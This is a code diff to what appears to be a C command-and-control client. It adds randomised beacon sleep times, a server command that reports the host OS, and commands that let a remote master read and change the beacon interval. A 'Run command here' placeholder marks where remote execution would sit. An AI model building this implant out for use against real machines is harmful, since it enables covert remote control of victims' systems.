@@ -5,13 +5,18 @@
 int main(int argc, char **argv){
     struct sockaddr_in master;
     char *data = NULL;
+    #ifdef CLIENT_DEBUG
+        int set_sleep = 3;
+    #else
+        int set_sleep = SLEEP_BASE;
+    #endif
     master_init(&master);
     while ( 1 ) {
         #ifdef CLIENT_DEBUG
-            int sleep_time = (rand() % 2) + 3;
-            printf("Sleeping for %d seconds... ",sleep_time);
+            int sleep_time = (rand() % 15) + set_sleep;
+            printf("Sleeping for %d seconds... ", sleep_time);
         #else
-            int sleep_time = (rand() % SLEEP_MAX) + SLEEP_BASE;
+            int sleep_time = (rand() % SLEEP_MAX) + set_sleep;
         #endif
 
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
@@ -37,6 +42,19 @@ int main(int argc, char **argv){
             puts("Run command here");
             data = (char*)malloc(strlen("Triggered")+1);
             strcpy(data, "Triggered");
+        }
+        if (!strncmp(resp, "get os", 7)){
+            data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
+            sprintf(data, "%s%s", "set os:", OS);
+        }
+        if (!strncmp(resp, "set sleep:", 10)){
+            sscanf((resp+10), "%d", &set_sleep);
+            data = (char*)malloc(strlen("SET SLEEP OK")+1);
+            strcpy(data, "SET SLEEP OK");
+        }
+        if (!strncmp(resp, "get sleep", 9)){
+            data = (char*)malloc(strlen("set sleep:")+snprintf(NULL, 0, "%d", set_sleep)+1);
+            sprintf(data, "set sleep:%d", set_sleep);
         }
         free(resp);
     }
